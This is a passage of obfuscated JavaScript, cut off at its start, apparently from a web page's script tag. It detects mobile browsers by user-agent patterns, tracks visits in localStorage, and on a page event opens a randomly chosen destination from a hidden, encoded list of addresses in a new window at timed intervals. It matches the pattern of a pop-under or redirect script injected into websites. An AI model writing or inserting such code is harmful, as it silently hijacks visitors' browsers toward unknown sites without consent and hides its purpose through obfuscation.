)|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());</script>
